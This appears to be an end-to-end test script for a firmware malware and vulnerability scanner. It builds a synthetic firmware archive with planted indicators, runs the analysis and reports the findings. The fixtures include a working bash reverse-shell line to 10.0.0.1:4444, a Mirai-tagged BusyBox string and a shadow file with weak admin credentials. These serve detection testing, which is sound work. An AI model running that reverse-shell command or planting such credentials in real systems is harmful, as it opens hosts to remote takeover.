import { execSync } from "node:child_process";
import { mkdtemp, rm, writeFile, mkdir } from "node:fs/promises";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { randomUUID } from "node:crypto";
import { db, scansTable, scanFilesTable, vulnerabilityFindingsTable } from "@workspace/db";
import { eq, sql } from "drizzle-orm";
import { runFirmwareAnalysis, createProgressStages } from "./firmware-analysis";

async function main() {
  console.log("=================================================");
  console.log("  REAL END-TO-END FIRMWARE ANALYSIS TEST & AUDIT ");
  console.log("=================================================\n");

  // Ensure user_settings table exists
  await db.execute(sql`CREATE TABLE IF NOT EXISTS user_settings (
    user_id text PRIMARY KEY,
    telemetry boolean NOT NULL DEFAULT false,
    deep_analysis boolean NOT NULL DEFAULT true,
    updated_at timestamp with time zone NOT NULL DEFAULT now()
  );`);

  // 1. Create a synthetic firmware folder with indicators
  const tempFolder = await mkdtemp(join(tmpdir(), "fw-e2e-build-"));
  const subBinDir = join(tempFolder, "bin");
  const subEtcDir = join(tempFolder, "etc");
  await mkdir(subBinDir, { recursive: true });
  await mkdir(subEtcDir, { recursive: true });

  // Add BusyBox version string
  await writeFile(join(subBinDir, "busybox"), "BusyBox v1.35.0 (2022-01-01) multi-call binary\n/bin/busybox MIRAI");

  // Add Reverse Shell script
  await writeFile(join(subBinDir, "backdoor.sh"), "#!/bin/sh\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n");

  // Add Shadow file with root hash
  await writeFile(join(subEtcDir, "shadow"), "root:$1$7856$aB:18294:0:99999:7:::\nadmin:admin1234:18294:0:99999:7:::\n");

  // Create ZIP archive
  const zipPath = join(tmpdir(), `test_firmware_${Date.now()}.zip`);
  execSync(`7z a "${zipPath}" "${tempFolder}/*"`, { stdio: "pipe" });

  const zipBytes = await import("node:fs/promises").then(fs => fs.readFile(zipPath));

  // 2. Insert scan into DB
  const scanId = `e2e-${randomUUID()}`;
  await db.insert(scansTable).values({
    id: scanId,
    firmwareName: "e2e_sample_firmware.zip",
    firmwareType: "ZIP archive",
    sizeBytes: zipBytes.length,
    status: "Uploaded",
    vulnerabilityCount: 0,
    malwareIndicatorCount: 0,
    progressStages: await createProgressStages(),
    progress: 0,
    progressMessage: "Upload received",
    extractionStatus: "Not started",
    sha256: "synthetic-digest-hash",
  });

  console.log(`▶ Inserted scan record ID: ${scanId}`);
  console.log(`▶ Launching runFirmwareAnalysis for ${zipBytes.length} bytes...`);

  // 3. Run Analysis Pipeline
  await runFirmwareAnalysis(scanId, "e2e_sample_firmware.zip", zipBytes);

  // 4. Retrieve Scan Result from Database
  const [scanRecord] = await db.select().from(scansTable).where(eq(scansTable.id, scanId));
  const filesList = await db.select().from(scanFilesTable).where(eq(scanFilesTable.scanId, scanId));
  const findingsList = await db.select().from(vulnerabilityFindingsTable).where(eq(vulnerabilityFindingsTable.scanId, scanId));

  console.log("\n=================================================");
  console.log("             ANALYSIS RESULTS SUMMARY            ");
  console.log("=================================================");
  console.log(`Status            : ${scanRecord.status}`);
  console.log(`Progress          : ${scanRecord.progress}% (${scanRecord.progressMessage})`);
  console.log(`Calculated Score  : ${scanRecord.riskScore}/100 (${scanRecord.riskLevel} Risk)`);
  console.log(`Files Discovered  : ${scanRecord.extractedFileCount}`);
  console.log(`Total Findings    : ${findingsList.length}`);
  console.log(`Malware Indicators: ${scanRecord.malwareIndicatorCount}`);
  console.log(`Extraction Summary: ${scanRecord.extractionStatus}`);

  console.log("\n▶ Extracted Files Inventory:");
  for (const f of filesList) {
    console.log(`  - ${f.path} (${f.type}, ${f.sizeBytes} bytes, SHA256: ${f.sha256.slice(0, 12)}...)`);
  }

  console.log("\n▶ Evidence-Backed Findings:");
  for (const finding of findingsList) {
    console.log(`  [${finding.severity}] ${finding.category} - ${finding.title}`);
    console.log(`      Path: ${finding.affectedPath}`);
    console.log(`      Source: ${finding.detectionSource} (Confidence: ${finding.confidence})`);
    console.log(`      Evidence: ${finding.evidence.slice(0, 80)}...`);
  }

  // Cleanup temp files
  await rm(tempFolder, { recursive: true, force: true }).catch(() => {});
  await rm(zipPath, { force: true }).catch(() => {});

  if (scanRecord.status === "Analysis Completed" && scanRecord.riskScore != null && scanRecord.riskScore > 0 && findingsList.length > 0) {
    console.log("\n✔ REAL END-TO-END ANALYSIS SUCCEEDED CLEANLY!");
    process.exit(0);
  } else {
    console.error("\n❌ ANALYSIS FAILED OR PRODUCED ZERO SCORE!");
    process.exit(1);
  }
}

main().catch(err => {
  console.error("Fatal error during E2E test:", err);
  process.exit(1);
});
